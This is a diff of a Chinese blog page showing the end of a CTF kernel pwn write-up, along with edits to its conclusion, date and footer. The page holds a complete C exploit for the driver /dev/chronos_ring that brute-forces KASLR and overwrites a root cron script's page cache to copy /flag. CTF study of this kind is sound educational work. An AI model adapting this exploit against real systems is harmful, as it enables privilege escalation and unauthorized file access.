class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_CREATE  0x1001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_AUTH    0x1002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_PIN     0x1003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_LOAD    0x1004</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_VIEW    0x1005</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1007</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SYNC    0x1008</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_QUERY   0x1009</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAGIC 0xf372fe94f82b3c6eULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MASK  0xfffffffffffe0000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KFREE_BASE 0xffffffff80000000ULL</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> dev = open(<span class="hljs-string">&quot;/dev/chronos_ring&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open dev&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 1. Create buffer */</span><br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_CREATE, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;CREATE fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Buffer created\n&quot;</span>);<br><br>    <span class="hljs-comment">/* 2. Write payload to buffer BEFORE loading file */</span><br>    <span class="hljs-type">char</span> payload[<span class="hljs-number">64</span>];<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(payload));<br>    <span class="hljs-built_in">strcpy</span>(payload, <span class="hljs-string">&quot;#!/bin/sh\ncat /flag&gt;/tmp/f\nchmod 777 /tmp/f\n#PADPAD\n&quot;</span>);<br>    <span class="hljs-type">int</span> plen = <span class="hljs-built_in">strlen</span>(payload);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">uint64_t</span> ptr; <span class="hljs-type">uint32_t</span> len; <span class="hljs-type">uint32_t</span> off; &#125; wr;<br>    wr.ptr = (<span class="hljs-type">uint64_t</span>)payload;<br>    wr.len = plen;<br>    wr.off = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_WRITE, &amp;wr) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;WRITE fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Payload written (%d bytes)\n&quot;</span>, plen);<br><br>    <span class="hljs-comment">/* 3. Brute-force KASLR for auth */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Brute-forcing KASLR...\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">uint64_t</span> key; <span class="hljs-type">uint32_t</span> val; <span class="hljs-type">uint32_t</span> pad; &#125; ar;<br>    <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2048</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> koff = (<span class="hljs-type">uint64_t</span>)i * <span class="hljs-number">0x200000U</span>LL;<br>        <span class="hljs-type">uint64_t</span> kfree = KFREE_BASE + koff;<br>        <span class="hljs-type">uint64_t</span> masked = (kfree &gt;&gt; <span class="hljs-number">4</span>) &amp; MASK;<br>        ar.key = MAGIC ^ masked;<br>        ar.val = <span class="hljs-number">0</span>;<br>        ar.pad = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(dev, CMD_AUTH, &amp;ar) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Auth OK! KASLR offset=0x%lx (try %d)\n&quot;</span>, koff, i);<br>            found = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        perror(<span class="hljs-string">&quot;[-] Auth brute-force failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 4. Open /tmp/job and load its file page */</span><br>    <span class="hljs-type">int</span> jfd = open(<span class="hljs-string">&quot;/tmp/job&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (jfd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open job&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">uint32_t</span> fd; <span class="hljs-type">uint32_t</span> pidx; &#125; lr;<br>    lr.fd = jfd;<br>    lr.pidx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_LOAD, &amp;lr) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;LOAD fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] File page loaded\n&quot;</span>);<br><br>    <span class="hljs-comment">/* 5. Pin a user page (sets flags &amp; 0x2) */</span><br>    <span class="hljs-type">void</span> *upage = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">4096</span>, PROT_READ | PROT_WRITE,<br>                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (upage == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(upage, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">4096</span>); <span class="hljs-comment">/* fault page in */</span><br>    <span class="hljs-type">uint64_t</span> uaddr = (<span class="hljs-type">uint64_t</span>)upage;<br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_PIN, &amp;uaddr) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;PIN fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] User page pinned\n&quot;</span>);<br><br>    <span class="hljs-comment">/* 6. Create view (backed by file page since file_loaded=1) */</span><br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_VIEW, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;VIEW fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] View created\n&quot;</span>);<br><br>    <span class="hljs-comment">/* Verify */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">uint32_t</span> flags; <span class="hljs-type">uint32_t</span> fl; <span class="hljs-type">uint32_t</span> vt; <span class="hljs-type">uint32_t</span> po; <span class="hljs-type">uint32_t</span> hp; &#125; qr;<br>    <span class="hljs-built_in">memset</span>(&amp;qr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(qr));<br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_QUERY, &amp;qr) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;QUERY fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] flags=0x%x file_loaded=%d view_type=%d\n&quot;</span>, qr.flags, qr.fl, qr.vt);<br><br>    <span class="hljs-comment">/* 7. Sync buffer to file page cache via READ_VIEW */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">uint64_t</span> unused; <span class="hljs-type">uint32_t</span> size; <span class="hljs-type">uint32_t</span> offset; &#125; rv;<br>    rv.unused = <span class="hljs-number">0</span>;<br>    rv.size = plen;<br>    rv.offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(dev, CMD_SYNC, &amp;rv) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;SYNC fail&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Page cache modified!\n&quot;</span>);<br><br>    <span class="hljs-comment">/* 8. Wait for root helper to execute */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Waiting for root cron (up to 5s)...\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        usleep(<span class="hljs-number">500000</span>);<br>        <span class="hljs-keyword">if</span> (access(<span class="hljs-string">&quot;/tmp/f&quot;</span>, F_OK) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Flag file appeared!\n&quot;</span>);<br>            <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-type">int</span> ffd = open(<span class="hljs-string">&quot;/tmp/f&quot;</span>, O_RDONLY);<br>            <span class="hljs-keyword">if</span> (ffd &gt;= <span class="hljs-number">0</span>) &#123;<br>                read(ffd, buf, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>);<br>                close(ffd);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[FLAG] %s\n&quot;</span>, buf);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (access(<span class="hljs-string">&quot;/tmp/f&quot;</span>, F_OK) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Flag file not found, try waiting longer\n&quot;</span>);<br>    &#125;<br><br>    close(jfd);<br>    close(dev);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>拿下flag</p>
 <p><img src="/images/134.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛时一道pwn都没做出来</p>
-<p>消沉了很久</p>
-<p>现在重新振作起来</p>
-<p>照着大佬们博客中的题解本地开始复盘，学习，内化，输出</p>
-<p>加油…</p>
+<h2 id="总结">总结</h2>
+<p>感谢阅读...</p>
+<p>生活愉快!</p>
 
                 
               </div>
@@ -594,7 +590,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年4月16日</div>
+          <div>2026年6月29日</div>
         </div>
       
       
@@ -745,7 +741,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
